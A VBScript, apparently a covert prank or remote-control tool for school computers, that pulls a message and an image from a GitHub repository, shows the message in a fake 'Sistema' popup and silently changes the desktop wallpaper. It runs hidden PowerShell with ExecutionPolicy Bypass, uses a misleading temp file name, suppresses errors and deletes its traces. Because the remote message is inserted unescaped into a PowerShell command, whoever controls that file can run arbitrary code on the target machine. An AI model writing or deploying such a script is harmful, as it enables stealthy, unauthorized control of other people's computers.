Option Explicit
On Error Resume Next

Dim shell, fso, urlImmagine, urlMessaggio, percorsoLocale, percorsoScript, scriptPS, messaggioDalWeb, xmlHttp

' URL ottimizzati per il download diretto
urlImmagine = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine.jpg"
urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- 1. RECUPERA IL MESSAGGIO ---
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", urlMessaggio, False
xmlHttp.Send
If xmlHttp.Status = 200 Then
    messaggioDalWeb = Trim(xmlHttp.responseText)
End If

' --- 2. MOSTRA IL POPUP (Solo se il messaggio non è vuoto) ---
If messaggioDalWeb <> "" Then
    Dim comandoPopup
    comandoPopup = "powershell -WindowStyle Hidden -NoProfile -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
        "$form = New-Object System.Windows.Forms.Form; $form.Text = 'Sistema'; $form.Size = New-Object System.Drawing.Size(400,180); " & _
        "$form.StartPosition = 'CenterScreen'; $form.FormBorderStyle = 'FixedDialog'; $form.ControlBox = $false; $form.TopMost = $true; " & _
        "$label = New-Object System.Windows.Forms.Label; $label.Text = '" & messaggioDalWeb & "'; $label.TextAlign = 'MiddleCenter'; $label.Dock = 'Fill'; " & _
        "$label.Font = New-Object System.Drawing.Font('Segoe UI', 11); " & _
        "$form.Controls.Add($label); $panel = New-Object System.Windows.Forms.Panel; $panel.Dock = 'Bottom'; $panel.Height = 50; " & _
        "$btn = New-Object System.Windows.Forms.Button; $btn.Text = 'OK'; $btn.Left = 160; $btn.Top = 10; $btn.Add_Click({$form.Close()}); " & _
        "$panel.Controls.Add($btn); $form.Controls.Add($panel); $form.ShowDialog() | Out-Null"""
    shell.Run comandoPopup, 0, True
End If

' --- 3. CAMBIO SFONDO ---
percorsoLocale = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Pictures\bg_data.jpg"
percorsoScript = shell.ExpandEnvironmentStrings("%TEMP%") & "\sys_task.ps1"

' PowerShell scarica l'immagine e forza l'aggiornamento dei parametri di sistema
scriptPS = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { " & _
    "(New-Object System.Net.WebClient).DownloadFile('" & urlImmagine & "', '" & percorsoLocale & "'); " & _
    "if (Test-Path '" & percorsoLocale & "') { " & _
    "$path = (Get-Item '" & percorsoLocale & "').FullName; " & _
    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $path; " & _
    "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'; " & _
    "$code = @' " & vbCrLf & _
    "using System; using System.Runtime.InteropServices; " & vbCrLf & _
    "public class Wallpaper { [DllImport(""user32.dll"")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); } " & vbCrLf & _
    "'@; Add-Type -TypeDefinition $code; [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x0003); } } catch {}"

Dim f
Set f = fso.CreateTextFile(percorsoScript, True)
f.Write scriptPS
f.Close

shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & percorsoScript & """", 0, True

' --- 4. PULIZIA ---
WScript.Sleep 5000
If fso.FileExists(percorsoScript) Then fso.DeleteFile percorsoScript
